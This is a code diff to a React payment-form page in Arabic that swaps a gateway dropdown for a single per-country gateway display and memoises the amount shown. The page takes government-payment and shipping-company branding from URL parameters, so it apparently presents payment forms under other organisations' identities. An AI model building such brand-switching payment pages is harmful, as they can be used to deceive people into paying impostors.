@@ -16,7 +16,7 @@ import BrandedCarousel from "@/components/BrandedCarousel";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import { getPaymentGatewaysByCountry } from "@/lib/paymentGateways";
+import { getPaymentGatewayByCountry } from "@/lib/paymentGateways";
 import PageLoader from "@/components/PageLoader";
 
 const PaymentData = () => {
@@ -47,7 +47,6 @@ const PaymentData = () => {
   const [invoiceNumber, setInvoiceNumber] = useState("");
   const [selectedService, setSelectedService] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("");
-  const [selectedPaymentGateway, setSelectedPaymentGateway] = useState("");
 
   let serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
   const countryParam = searchParams.get('country') || searchParams.get('c');
@@ -114,8 +113,13 @@ const PaymentData = () => {
   });
 
   // Calculate formatted amount dynamically based on input
-  const displayAmount = paymentAmount ? parseFloat(paymentAmount) : amount;
-  const formattedAmount = formatCurrency(displayAmount, countryCode);
+  const displayAmount = useMemo(() => {
+    return paymentAmount ? parseFloat(paymentAmount) : amount;
+  }, [paymentAmount, amount]);
+  
+  const formattedAmount = useMemo(() => {
+    return formatCurrency(displayAmount, countryCode);
+  }, [displayAmount, countryCode]);
 
   if (isLoading && !showPage) {
     return <PageLoader message="جاري تحميل بيانات الفاتورة..." />;
@@ -224,6 +228,20 @@ const PaymentData = () => {
                   >
                     إكمال بيانات الدفع
                   </h1>
+
+                  {/* Dynamic Amount Display */}
+                  <div 
+                    className="inline-flex items-center gap-2 px-4 py-2 rounded-full text-base font-bold mt-2" 
+                    style={{ 
+                      background: govSystem.gradients.primary,
+                      color: '#ffffff',
+                      boxShadow: govSystem.shadows.lg
+                    }}
+                  >
+                    <CreditCard className="w-4 h-4" />
+                    <span>المبلغ:</span>
+                    <span>{formattedAmount}</span>
+                  </div>
 
                   <div
                     className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
@@ -363,49 +381,38 @@ const PaymentData = () => {
                     )}
                   </div>
 
-                  {/* Payment Gateway Selection */}
-                  <div>
-                    <Label 
-                      className="mb-2 text-sm font-bold flex items-center gap-2"
-                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                  {/* Payment Gateway Display - Single Gateway per Country */}
+                  {paymentGateway && (
+                    <div 
+                      className="p-4 rounded-lg border-2 flex items-center gap-3"
+                      style={{
+                        borderColor: govSystem.colors.primary,
+                        background: `${govSystem.colors.primary}08`
+                      }}
                     >
-                      <CreditCard className="w-4 h-4" />
-                      بوابة الدفع *
-                    </Label>
-                    <Select value={selectedPaymentGateway} onValueChange={setSelectedPaymentGateway}>
-                      <SelectTrigger 
-                        className="h-10 sm:h-12 border-2 focus:border-primary transition-all"
+                      <div 
+                        className="w-12 h-12 rounded-lg flex items-center justify-center"
                         style={{
-                          borderColor: companyBranding?.colors.border || '#e5e7eb',
-                          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                          background: govSystem.colors.surface
                         }}
                       >
-                        <SelectValue placeholder="اختر بوابة الدفع" />
-                      </SelectTrigger>
-                      <SelectContent className="bg-background z-50">
-                        {paymentGateways.map((gateway) => (
-                          <SelectItem key={gateway.id} value={gateway.id}>
-                            <div className="flex items-center gap-2">
-                              <span>{gateway.nameAr}</span>
-                              {gateway.popular && (
-                                <span className="text-xs bg-primary/10 text-primary px-2 py-0.5 rounded">
-                                  الأكثر استخداماً
-                                </span>
-                              )}
-                            </div>
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                    {selectedPaymentGateway && (
-                      <p className="text-xs text-muted-foreground mt-1">
-                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'local' && 'بوابة دفع محلية'}
-                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'wallet' && 'محفظة إلكترونية'}
-                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'card' && 'بطاقة ائتمانية/مدى'}
-                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'bank' && 'تحويل بنكي'}
-                      </p>
-                    )}
-                  </div>
+                        <CreditCard className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
+                      </div>
+                      <div className="flex-1">
+                        <p className="text-xs text-gray-500 mb-1">بوابة الدفع</p>
+                        <p 
+                          className="font-bold text-base"
+                          style={{ 
+                            color: govSystem.colors.primary,
+                            fontFamily: govSystem.fonts.primaryAr 
+                          }}
+                        >
+                          {paymentGateway.nameAr}
+                        </p>
+                        <p className="text-xs text-gray-600">{paymentGateway.description}</p>
+                      </div>
+                    </div>
+                  )}
 
                   <div>
                     <Label 
@@ -414,7 +421,7 @@ const PaymentData = () => {
                       style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                     >
                       <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
-                      مبلغ السداد *
+                      مبلغ الدفع *
                     </Label>
                     <Input
                       id="amount"
